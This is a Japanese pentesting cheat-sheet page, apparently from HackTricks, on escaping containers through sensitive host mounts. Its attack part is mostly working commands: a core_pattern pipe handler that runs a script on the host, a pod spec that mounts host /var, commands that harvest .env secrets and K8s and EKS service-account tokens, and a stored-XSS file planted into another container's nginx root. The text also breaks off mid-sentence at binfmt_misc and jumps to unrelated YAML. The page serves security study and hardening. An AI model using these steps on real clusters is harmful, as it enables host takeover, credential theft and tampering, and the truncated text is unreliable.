# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

`/proc`、`/sys`、および`/var`の適切な名前空間の分離なしでの露出は、攻撃面の拡大や情報漏洩を含む重大なセキュリティリスクを引き起こします。これらのディレクトリには、誤って設定されたり、無許可のユーザーによってアクセスされたりすると、コンテナの脱出、ホストの変更、またはさらなる攻撃を助ける情報を提供する可能性のある機密ファイルが含まれています。たとえば、`-v /proc:/host/proc`を誤ってマウントすると、パスベースの性質によりAppArmorの保護を回避し、`/host/proc`が保護されなくなります。

**各潜在的脆弱性の詳細は** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**で確認できます。**

## procfs Vulnerabilities

### `/proc/sys`

このディレクトリは、通常`sysctl(2)`を介してカーネル変数を変更するためのアクセスを許可し、いくつかの懸念されるサブディレクトリを含んでいます。

#### **`/proc/sys/kernel/core_pattern`**

- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)で説明されています。
- コアファイル生成時に実行するプログラムを定義でき、最初の128バイトが引数として渡されます。ファイルがパイプ`|`で始まる場合、コード実行につながる可能性があります。
- **テストと悪用の例**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 書き込みアクセスのテスト
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # カスタムハンドラを設定
sleep 5 && ./crash & # ハンドラをトリガー
```

#### **`/proc/sys/kernel/modprobe`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳述されています。
- カーネルモジュールローダーへのパスが含まれ、カーネルモジュールをロードするために呼び出されます。
- **アクセス確認の例**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobeへのアクセスを確認
```

#### **`/proc/sys/vm/panic_on_oom`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で参照されています。
- OOM条件が発生したときにカーネルがパニックを起こすか、OOMキラーを呼び出すかを制御するグローバルフラグです。

#### **`/proc/sys/fs`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)によれば、ファイルシステムに関するオプションと情報が含まれています。
- 書き込みアクセスにより、ホストに対するさまざまなサービス拒否攻撃を可能にします。

#### **`/proc/sys/fs/binfmt_misc`**

- マジックナンバーに基づいて非ネイティブバイナリ形式のインタプリタを登録できます。
- `/proc/sys/fs/binfmt_misc/register`が書き込み可能な場合、特権
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
**pod-mounts-var-folder** コンテナ内:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
XSSは次のように達成されました：

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

コンテナは再起動やその他の操作を必要としないことに注意してください。マウントされた**/var**フォルダーを介して行われた変更は即座に適用されます。

構成ファイル、バイナリ、サービス、アプリケーションファイル、およびシェルプロファイルを置き換えることで、自動（または半自動）RCEを達成することもできます。

##### クラウド資格情報へのアクセス

コンテナはK8sサービスアカウントトークンまたはAWSウェブアイデンティティトークンを読み取ることができ、これによりコンテナはK8sまたはクラウドへの不正アクセスを得ることができます。
```bash
/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
#### Docker

Docker（またはDocker Composeデプロイメント）でのエクスプロイトは全く同じですが、通常、他のコンテナのファイルシステムは異なるベースパスの下で利用可能です：
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
ファイルシステムは `/var/lib/docker/overlay2/` の下にあります:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### 注意

実際のパスは異なるセットアップによって異なる場合があるため、他のコンテナのファイルシステムを見つけるには、**find** コマンドを使用するのが最善です。



### 参考文献

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
